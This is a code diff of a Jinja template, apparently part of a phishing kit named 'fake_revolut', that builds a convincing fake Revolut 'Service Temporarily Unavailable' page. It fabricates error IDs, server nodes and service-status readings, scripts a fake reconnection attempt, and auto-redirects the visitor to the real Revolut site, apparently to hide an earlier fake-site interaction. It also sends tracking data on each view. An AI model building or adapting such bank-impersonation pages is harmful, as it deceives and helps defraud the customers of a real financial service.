@@ -1,57 +1,435 @@
 {% extends "revolut/base.html" %}
 
-{% block title %}Oops! Something went wrong - Revolut{% endblock %}
+{% block title %}Service Temporarily Unavailable - Revolut{% endblock %}
+
+{% block extra_head %}
+<style>
+@keyframes flicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.8; }
+}
+
+@keyframes glitch {
+    0% { transform: translate(0); }
+    20% { transform: translate(-2px, 2px); }
+    40% { transform: translate(-2px, -2px); }
+    60% { transform: translate(2px, 2px); }
+    80% { transform: translate(2px, -2px); }
+    100% { transform: translate(0); }
+}
+
+@keyframes countdown {
+    from { width: 100%; }
+    to { width: 0%; }
+}
+
+.error-screen {
+    background: linear-gradient(135deg, #1a1a3e 0%, #0f0f23 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+}
+
+.error-screen::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: repeating-linear-gradient(
+        90deg,
+        transparent,
+        transparent 2px,
+        rgba(255, 255, 255, 0.03) 2px,
+        rgba(255, 255, 255, 0.03) 4px
+    );
+    animation: flicker 3s infinite;
+}
+
+.crash-card {
+    background: rgba(26, 26, 62, 0.95);
+    border-radius: 20px;
+    padding: 3rem;
+    box-shadow: 
+        0 20px 60px rgba(0, 0, 0, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+    width: 100%;
+    max-width: 500px;
+    text-align: center;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    position: relative;
+    z-index: 1;
+    backdrop-filter: blur(10px);
+}
+
+.error-header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 2rem;
+    gap: 1rem;
+}
+
+.revolut-mini-logo {
+    width: 40px;
+    height: 40px;
+    background: var(--revolut-primary);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-weight: bold;
+    font-size: 1.2rem;
+}
+
+.error-title {
+    font-size: 1.1rem;
+    color: #d1d5db;
+    margin: 0;
+}
+
+.crash-icon {
+    font-size: 4rem;
+    margin-bottom: 1.5rem;
+    color: #f59e0b;
+    animation: glitch 2s infinite;
+    filter: drop-shadow(0 0 10px rgba(245, 158, 11, 0.3));
+}
+
+.crash-title {
+    font-size: 2rem;
+    font-weight: 700;
+    margin-bottom: 1rem;
+    color: #ffffff;
+    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+}
+
+.crash-subtitle {
+    font-size: 1.1rem;
+    color: #f59e0b;
+    margin-bottom: 1.5rem;
+    font-weight: 500;
+}
+
+.crash-message {
+    color: #d1d5db;
+    margin-bottom: 2rem;
+    line-height: 1.6;
+    font-size: 0.95rem;
+}
+
+.error-details {
+    background: rgba(15, 15, 35, 0.8);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 12px;
+    padding: 1.5rem;
+    margin-bottom: 2rem;
+    font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', monospace;
+    font-size: 0.85rem;
+    color: #10b981;
+    text-align: left;
+    box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.3);
+    position: relative;
+}
+
+.error-details::before {
+    content: '●●●';
+    position: absolute;
+    top: 0.5rem;
+    right: 1rem;
+    color: #ef4444;
+    font-size: 0.8rem;
+    animation: flicker 1.5s infinite;
+}
+
+.progress-container {
+    margin: 2rem 0;
+    padding: 1rem;
+    background: rgba(15, 15, 35, 0.5);
+    border-radius: 8px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.progress-label {
+    color: #9ca3af;
+    font-size: 0.9rem;
+    margin-bottom: 0.5rem;
+    text-align: left;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 6px;
+    background: rgba(55, 65, 81, 0.5);
+    border-radius: 3px;
+    overflow: hidden;
+    margin-bottom: 0.5rem;
+}
+
+.progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #f59e0b, #ef4444);
+    border-radius: 3px;
+    animation: countdown 8s linear forwards;
+    box-shadow: 0 0 10px rgba(245, 158, 11, 0.5);
+}
+
+.progress-time {
+    color: #6b7280;
+    font-size: 0.8rem;
+    text-align: right;
+}
+
+.system-status {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin: 1.5rem 0;
+    font-size: 0.85rem;
+}
+
+.status-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0.5rem;
+    background: rgba(15, 15, 35, 0.3);
+    border-radius: 6px;
+    border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.status-label {
+    color: #9ca3af;
+}
+
+.status-value {
+    color: #10b981;
+    font-weight: 500;
+}
+
+.status-error {
+    color: #ef4444;
+}
+
+.reload-button {
+    background: linear-gradient(135deg, var(--revolut-primary), var(--revolut-secondary));
+    color: white;
+    border: none;
+    padding: 16px 32px;
+    font-size: 1rem;
+    font-weight: 600;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    min-width: 180px;
+    box-shadow: 
+        0 4px 15px rgba(99, 102, 241, 0.3),
+        inset 0 1px 0 rgba(255, 255, 255, 0.2);
+    position: relative;
+    overflow: hidden;
+}
+
+.reload-button::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: left 0.5s;
+}
+
+.reload-button:hover::before {
+    left: 100%;
+}
+
+.reload-button:hover {
+    transform: translateY(-2px) scale(1.02);
+    box-shadow: 
+        0 8px 25px rgba(99, 102, 241, 0.4),
+        inset 0 1px 0 rgba(255, 255, 255, 0.3);
+}
+
+.reload-button:active {
+    transform: translateY(0) scale(1);
+}
+
+.help-text {
+    margin-top: 2rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+    color: #9ca3af;
+    font-size: 0.85rem;
+    line-height: 1.5;
+}
+
+.blink {
+    animation: flicker 1s infinite;
+}
+
+@media (max-width: 768px) {
+    .crash-card {
+        margin: 1rem;
+        padding: 2rem;
+    }
+    
+    .crash-title {
+        font-size: 1.5rem;
+    }
+    
+    .crash-icon {
+        font-size: 3rem;
+    }
+    
+    .system-status {
+        grid-template-columns: 1fr;
+    }
+}
+</style>
+{% endblock %}
+
+{% block header %}{% endblock %}
+{% block footer %}{% endblock %}
 
 {% block content %}
-<div class="crash-container">
+<div class="error-screen">
     <div class="crash-card">
-        <div class="crash-icon">⚠️</div>
-        
-        <h1 class="crash-title">Oops! Something went wrong</h1>
-        
-        <p class="crash-message">
-            We're experiencing a temporary issue with our servers. 
-            This sometimes happens during high traffic periods or system maintenance.
-        </p>
-        
-        <div class="crash-details">
-            Error Code: REV_5XX_TEMP<br>
-            Time: <span id="error-time"></span><br>
-            Session: {{ session.get('revolut_session_id', 'N/A')[:8] }}...
+        <div class="error-header">
+            <div class="revolut-mini-logo">R</div>
+            <h4 class="error-title">Revolut</h4>
         </div>
         
+        <div class="crash-icon blink">⚠️</div>
+        
+        <h1 class="crash-title">Service Temporarily Unavailable</h1>
+        <p class="crash-subtitle">HTTP 503 - Server Overload</p>
+        
         <p class="crash-message">
-            Please try reloading the page. If the problem persists, you'll be redirected to our main site.
+            Our servers are experiencing high traffic and temporary connectivity issues. 
+            This is usually resolved within a few minutes. We apologize for the inconvenience.
         </p>
         
+        <div class="error-details">
+            <div>Error ID: REV_503_{{ session.get('revolut_session_id', 'UNKNOWN')[:8] or 'TMP' }}{{ range(100, 999) | random }}</div>
+            <div>Timestamp: <span id="error-timestamp"></span></div>
+            <div>Node: eu-west-1-prod-{{ range(1, 9) | random }}</div>
+            <div>Request ID: {{ range(10000000, 99999999) | random }}</div>
+        </div>
+        
+        <div class="system-status">
+            <div class="status-item">
+                <span class="status-label">API Status</span>
+                <span class="status-value status-error">Degraded</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Database</span>
+                <span class="status-value">Operational</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Auth Service</span>
+                <span class="status-value status-error">Timeout</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Load Balancer</span>
+                <span class="status-value">Healthy</span>
+            </div>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-label">Automatic retry in progress...</div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="progress-time" id="countdown">Redirecting in <span id="timer">8</span>s</div>
+        </div>
+        
         <a href="{{ url_for('fake_revolut.reload_after_crash') }}" class="reload-button" id="reload-btn">
-            🔄 Reload Page
+            🔄 Retry Connection
         </a>
         
-        <div style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid var(--revolut-border-dark);">
-            <p style="font-size: 0.9rem; color: #9ca3af;">
-                If you continue to experience issues, please contact our support team.
-            </p>
+        <div class="help-text">
+            If this issue persists, please check our <strong>status page</strong> or contact support.<br>
+            You will be automatically redirected to our main site if the issue continues.
         </div>
     </div>
 </div>
 
 <script>
-    // Show current time for error timestamp
-    document.getElementById('error-time').textContent = new Date().toLocaleString();
+document.addEventListener('DOMContentLoaded', function() {
+    // Set error timestamp
+    document.getElementById('error-timestamp').textContent = new Date().toISOString();
     
-    // Add some loading effect to the reload button
-    document.getElementById('reload-btn').addEventListener('click', function(e) {
-        this.innerHTML = '⏳ Reloading...';
+    // Countdown timer
+    let timeLeft = 8;
+    const timerElement = document.getElementById('timer');
+    const reloadBtn = document.getElementById('reload-btn');
+    
+    const countdown = setInterval(function() {
+        timeLeft--;
+        timerElement.textContent = timeLeft;
+        
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            // Auto-redirect to real Revolut after countdown
+            window.location.href = '{{ url_for("fake_revolut.reload_after_crash") }}';
+        }
+    }, 1000);
+    
+    // Enhanced reload button interaction
+    reloadBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        clearInterval(countdown);
+        
+        this.innerHTML = '⏳ Attempting to reconnect...';
         this.style.pointerEvents = 'none';
+        this.style.opacity = '0.7';
+        
+        // Show realistic connection attempt
+        setTimeout(() => {
+            this.innerHTML = '🔄 Establishing connection...';
+            
+            setTimeout(() => {
+                this.innerHTML = '❌ Connection failed';
+                
+                setTimeout(() => {
+                    window.location.href = '{{ url_for("fake_revolut.reload_after_crash") }}';
+                }, 1000);
+            }, 2000);
+        }, 1500);
     });
+    
+    // Add some random glitch effects
+    setInterval(() => {
+        const elements = document.querySelectorAll('.status-value');
+        const randomElement = elements[Math.floor(Math.random() * elements.length)];
+        if (randomElement && Math.random() < 0.1) {
+            randomElement.style.animation = 'glitch 0.3s';
+            setTimeout(() => {
+                randomElement.style.animation = '';
+            }, 300);
+        }
+    }, 2000);
     
     // Track the crash page view
     if (window.revolutTracker) {
         window.revolutTracker.sendTrackingData('crash_page_viewed', {
             timestamp: new Date().toISOString(),
-            user_agent: navigator.userAgent
+            user_agent: navigator.userAgent,
+            error_type: 'service_unavailable',
+            auto_redirect_seconds: 8
         });
     }
+});
 </script>
 {% endblock %}
